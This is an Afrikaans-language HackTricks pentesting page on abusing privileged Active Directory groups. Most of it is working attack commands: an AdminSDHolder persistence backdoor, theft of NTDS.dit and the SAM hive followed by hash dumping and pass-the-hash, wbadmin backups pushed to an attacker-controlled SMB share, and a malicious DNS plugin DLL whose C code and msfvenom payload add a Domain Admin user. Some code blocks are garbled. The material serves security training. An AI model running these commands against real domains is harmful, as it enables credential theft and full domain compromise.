# Bevoorregte Groepe

{{#include ../../banners/hacktricks-training.md}}

## Bekende groepe met administratiewe bevoegdhede

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Hierdie groep het die bevoegdheid om rekeninge en groepe te skep wat nie administrateurs op die domein is nie. Daarbenewens laat dit plaaslike aanmelding op die Domain Controller (DC) toe.

Om die lede van hierdie groep te identifiseer, word die volgende opdrag uitgevoer:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dit is toegelaat om nuwe gebruikers by te voeg, sowel as plaaslike aanmelding op die DC.

## AdminSDHolder groep

Die Access Control List (ACL) van die **AdminSDHolder** groep is van kardinale belang aangesien dit toestemmings stel vir alle "beskermde groepe" binne Active Directory, insluitend groepe met hoë voorregte. Hierdie meganisme verseker die veiligheid van hierdie groepe deur ongemagtigde wysigings te voorkom.

'n aanvaller kan hiervan voordeel trek deur die ACL van die **AdminSDHolder** groep te wysig en 'n standaard gebruiker volle regte te gee. Dit sou daardie gebruiker effektief volle beheer oor al die beskermde groepe gee. As hierdie gebruiker se regte gewysig of verwyder word, sal dit weens die stelselontwerp binne 'n uur outomaties herstel word.

Kommando's om die lede te bekyk en toestemmings te wysig sluit in:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Daar is 'n script beskikbaar om die herstelproses te versnel: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Vir meer besonderhede, besoek [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Lidmaatskap van hierdie groep laat toe dat verwyderde Active Directory-objekte gelees word, wat sensitiewe inligting kan openbaar:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Toegang tot die Domain Controller

Toegang tot lêers op die DC is beperk tensy die gebruiker deel is van die `Server Operators`-groep, wat die toegangsvlak verander.

### Privilege Escalation

Deur `PsService` of `sc` van Sysinternals te gebruik, kan 'n mens dienspermissies inspekteer en wysig. Die `Server Operators`-groep het byvoorbeeld volle beheer oor sekere dienste, wat die uitvoering van arbitrêre opdragte en privilege escalation toelaat:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Hierdie opdrag openbaar dat `Server Operators` volle toegang het, wat die manipulering van dienste vir verhoogde regte moontlik maak.

## Backup Operators

Lidmaatskap van die `Backup Operators`-groep verleen toegang tot die `DC01` lêerstelsel as gevolg van die `SeBackup` en `SeRestore` voorregte. Hierdie voorregte laat toe om deur gidse te navigeer, lyste te genereer en lêers te kopieer, selfs sonder eksplisiete toestemmings, deur die `FILE_FLAG_BACKUP_SEMANTICS` vlag te gebruik. Die gebruik van spesifieke skripte is nodig vir hierdie proses.

Om groepslede te lys, voer uit:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Plaaslike Aanval

Om hierdie voorregte plaaslik te benut, word die volgende stappe uitgevoer:

1. Importeer die nodige biblioteke:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Aktiveer en verifieer `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Verkry toegang tot en kopieer lêers uit beperkte gidse, byvoorbeeld:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD-aanval

Direkte toegang tot die Domain Controller se lêerstelsel maak die diefstal van die `NTDS.dit` databasis moontlik, wat alle NTLM-hashes vir domeingebruikers en rekenaars bevat.

#### Gebruik diskshadow.exe

1. Skep 'n shadow copy van die `C` drive:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopieer `NTDS.dit` vanaf die shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatiewelik, gebruik `robocopy` om lêers te kopieer:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Onttrek `SYSTEM` en `SAM` vir die verkryging van hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Haal alle hashes uit `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Na-uittrekking: Pass-the-Hash na DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Gebruik wbadmin.exe

1. Stel 'n NTFS-lêerstelsel in vir 'n SMB server op die aanvallermasjien en kas SMB-aanmeldbewyse op die teikenmasjien.
2. Gebruik `wbadmin.exe` vir stelsel-rugsteun en die onttrekking van `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Lede van die **DnsAdmins** groep kan hul voorregte misbruik om 'n arbitrêre DLL met SYSTEM-voorregte op 'n DNS-bediener te laai, wat dikwels op Domain Controllers gehuisves word. Hierdie vermoë bied aansienlike eksploitasiemoontlikhede.

Om lede van die DnsAdmins groep te lys, gebruik:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Voer willekeurige DLL uit (CVE‑2021‑40469)

> [!NOTE]
> Hierdie kwesbaarheid maak die uitvoering van willekeurige kode met SYSTEM-bevoegdhede in die DNS-diens moontlik (gewoonlik binne die DCs). Hierdie probleem is in 2021 opgelos.

Lede kan die DNS-bediener 'n willekeurige DLL laat laai (hetsy plaaslik of vanaf 'n afgeleë share) deur opdragte soos:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Om die DNS-diens te herbegin (wat addisionele toestemmings mag vereis) is nodig sodat die DLL gelaai kan word:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Vir meer besonderhede oor hierdie aanvalvektor, verwys na ired.team.

#### Mimilib.dll

Dit is ook moontlik om mimilib.dll te gebruik vir opdraguitvoering, deur dit te wysig om spesifieke opdragte of reverse shells uit te voer. [Kyk na hierdie pos](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) vir meer inligting.

### WPAD-rekord vir MitM

DnsAdmins kan DNS-rekords manipuleer om Man-in-the-Middle (MitM)-aanvalle uit te voer deur 'n WPAD-rekord te skep nadat die globale query-bloklys gedeaktiveer is. Gereedskap soos Responder of Inveigh kan gebruik word vir spoofing en om netwerkverkeer vas te vang.

### Gebeurtenisloglesers
Lede kan toegang tot gebeurtenislogboeke kry en moontlik sensitiewe inligting vind, soos wagwoorde in platteks of besonderhede oor opdraguitvoering:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Hierdie groep kan DACLs op die domain object wysig, wat moontlik DCSync privileges kan verleen. Tegnieke vir privilege escalation wat hierdie groep uitbuit, word in die Exchange-AD-Privesc GitHub repo uiteengesit.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Hyper-V Administrators het volle toegang tot Hyper-V, wat misbruik kan word om beheer oor gevirtualiseerde Domain Controllers te verkry. Dit sluit in die kloon van lewende DCs en die onttrekking van NTLM-hashes uit die NTDS.dit-lêer.

### Exploitation Example

Firefox's Mozilla Maintenance Service kan deur Hyper-V Administrators uitgebuit word om opdragte as SYSTEM uit te voer. Dit behels die skep van 'n hard link na 'n beskermde SYSTEM-lêer en dit te vervang met 'n kwaadwillige uitvoerbare lêer:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Nota: Hard link exploitation is in onlangse Windows-opdaterings gemitigeer.

## Group Policy Creators Owners

Hierdie groep laat lede toe om Group Policies in die domein te skep. Hulle lede kan egter nie Group Policies op gebruikers of groepe toepas nie, of bestaande GPOs wysig.

## Organization Management

In omgewings waar **Microsoft Exchange** ontplooi is, het 'n spesiale groep bekend as **Organization Management** betekenisvolle bevoegdhede. Hierdie groep het die voorreg om **toegang tot die posbusse van alle domeingebruikers** te kry en behou **volledige beheer oor die 'Microsoft Exchange Security Groups'** Organizational Unit (OU). Hierdie beheer sluit die **`Exchange Windows Permissions`** groep in, wat uitgebuit kan word vir privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Lede van die **Print Operators** groep beskik oor verskeie voorregte, insluitend die **`SeLoadDriverPrivilege`**, wat hulle toelaat om **lokaal aan te meld op 'n Domain Controller'**, dit af te skakel, en drukkers te bestuur. Om hierdie voorregte te benut, veral as **`SeLoadDriverPrivilege`** nie in 'n nie-verhoogde konteks sigbaar is nie, is dit nodig om User Account Control (UAC) te omseil.

Om die lede van hierdie groep te lys, word die volgende PowerShell-opdrag gebruik:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Vir meer gedetailleerde uitbuitingsmetodes verwant aan **`SeLoadDriverPrivilege`**, behoort mens spesifieke sekuriteitsbronne te raadpleeg.

#### Remote Desktop Users

Lede van hierdie groep kry toegang tot rekenaars via Remote Desktop Protocol (RDP). Om hierdie lede te lys, is daar PowerShell-opdragte beskikbaar:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Verder insigte oor die uitbuiting van RDP kan in toegewyde pentesting-hulpbronne gevind word.

#### Gebruikers vir afstandsbestuur

Lede kan toegang tot rekenaars kry via **Windows Remote Management (WinRM)**. Enumeration van hierdie lede word bereik deur:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Vir eksplorasietegnieke verwant aan **WinRM**, moet spesifieke dokumentasie geraadpleeg word.

#### Bediener-operateurs

Hierdie groep het toestemming om verskeie konfigurasies op Domeincontrollers uit te voer, insluitend rugsteun- en herstelbevoegdhede, om die stelseltyd te verander en om die stelsel af te skakel. Om die lede te lys, is die opdrag wat gegee word:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Verwysings <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
